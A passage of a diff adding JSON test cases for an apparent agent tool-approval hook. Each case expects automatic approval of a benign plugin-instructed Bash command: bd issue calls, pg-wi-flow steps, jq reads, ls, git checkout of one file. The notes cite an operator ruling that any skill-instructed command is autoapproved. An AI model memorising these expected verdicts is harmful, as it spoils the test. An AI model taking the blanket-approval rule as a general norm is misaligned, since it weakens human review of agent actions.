+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit gold seed" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_show_pg2_abc12_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd -C /repo show pg2-abc12 --json" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_update_pg2_abc12_append_notes_checkpoint_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd -C /repo update pg2-abc12 --append-notes 'checkpoint'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_list_label_improvement_retro_sort_created_n_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd -C /repo list --label improvement-retro --sort created -n 1 --json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_create_improvement_retro_labels_improvement_re_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd -C /repo create \"Improvement retro\" --labels improvement-retro"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_update_pg2_abc12_claim_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd -C /repo update pg2-abc12 --claim --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_update_pg2_abc12_body_file_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd -C /repo update pg2-abc12 --body-file -" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_bd_c_repo_close_pg2_abc12_reason_retro_complete_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd -C /repo close pg2-abc12 --reason 'retro complete'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_next_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow next" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_next_stage_s_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow next --stage s" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_next_id_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow next --id pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_explain_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow explain pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_release_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow release pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_claim_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow claim pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_round_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow round pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_resolve_pg2_abc12_answer_a_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow resolve pg2-abc12 --answer A" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_resolve_pg2_abc12_decision_d_rationale_r_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-wi-flow resolve pg2-abc12 --decision D --rationale R"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_resolve_pg2_abc12_abandon_reason_code_r_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-wi-flow resolve pg2-abc12 --abandon --reason-code r"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_resolve_pg2_abc12_defer_2026_10_10_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-wi-flow resolve pg2-abc12 --defer 2026-10-10"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_escalate_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow escalate pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_list_stale_reserved_hours_2_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow list --stale --reserved-hours 2" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_wi_flow_pg_wi_flow_list_attended_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-wi-flow"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-wi-flow list --attended" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-wi-flow plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_evaluate_settings_repo_cla_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver evaluate --settings=/repo/.claude/settings.local.json --format=json > /tmp/ceta-settings-eval.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_evaluate_misses_only_forma_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver evaluate --misses-only --format=json > /tmp/ceta-misses.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_evaluate_format_json_tmp_c_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver evaluate --format=json > /tmp/ceta-all.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_evaluate_corpus_tmp_c_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver evaluate --corpus /tmp/c.json --format=json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_show_1_2_3_format_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver show 1 2 3 --format=json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_lint_embedded_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver lint --embedded"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_lint_tmp_spec_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver lint /tmp/spec.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_claude_extended_tool_approver_spec_drift_check_embedded_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-extended-tool-approver spec-drift-check --embedded"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_jq_length_tmp_ceta_misses_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "jq 'length' /tmp/ceta-misses.json" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_jq_permissions_allow_repo_claude_settings_local_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "jq '.permissions.allow' /repo/.claude/settings.local.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_ls_la_repo_claude_settings_local_json_2_dev_null_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "ls -la /repo/.claude/settings.local.json 2>/dev/null"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_bd_create_title_absorb_setting_description_d_type_task_p_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create --title=\"Absorb setting\" --description=\"d\" --type=task --priority=2"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_bd_label_add_pg2_abc12_claude_extended_tool_approver_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd label add pg2-abc12 claude-extended-tool-approver"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_git_checkout_internal_embeddedspecs_data_jq_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git checkout -- internal/embeddedspecs/data/jq.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_claude_extended_tool_approver_man_jq_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "claude-extended-tool-approver"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "man jq" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the claude-extended-tool-approver plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_behavior_docs_conformance_claude_marketplace_behavior_docs_conformance_skills_beha_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "behavior-docs-conformance"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/behavior-docs-conformance/skills/behavior-docs-impl-conformance/scripts/impl-traces.sh set impl"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the behavior-docs-conformance plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_behavior_docs_conformance_claude_marketplace_behavior_docs_conformance_skills_beha_approve_2",
+    "tags": ["plugin-instructed", "cjfpy2", "behavior-docs-conformance"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/behavior-docs-conformance/skills/behavior-docs-inter-conformance/scripts/resolve-imports.sh owner implementer"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the behavior-docs-conformance plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_behavior_docs_conformance_claude_marketplace_behavior_docs_conformance_skills_beha_approve_3",
+    "tags": ["plugin-instructed", "cjfpy2", "behavior-docs-conformance"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/behavior-docs-conformance/skills/behavior-docs-inter-conformance/scripts/name-collisions.sh setA setB"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the behavior-docs-conformance plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_behavior_docs_conformance_claude_marketplace_behavior_docs_conformance_skills_beha_approve_4",
+    "tags": ["plugin-instructed", "cjfpy2", "behavior-docs-conformance"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/behavior-docs-conformance/skills/behavior-docs-intra-conformance/scripts/self-checks.sh target"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the behavior-docs-conformance plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_behavior_docs_conformance_claude_marketplace_behavior_docs_conformance_skills_beha_approve_5",
+    "tags": ["plugin-instructed", "cjfpy2", "behavior-docs-conformance"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/behavior-docs-conformance/skills/behavior-docs-intra-conformance/scripts/trace-extract.sh target"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the behavior-docs-conformance plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_behavior_docs_conformance_claude_marketplace_behavior_docs_conformance_skills_beha_approve_6",
+    "tags": ["plugin-instructed", "cjfpy2", "behavior-docs-conformance"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/behavior-docs-conformance/skills/behavior-docs-intra-conformance/scripts/relocation-check.sh target"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the behavior-docs-conformance plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_bgcheck_flake_check_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
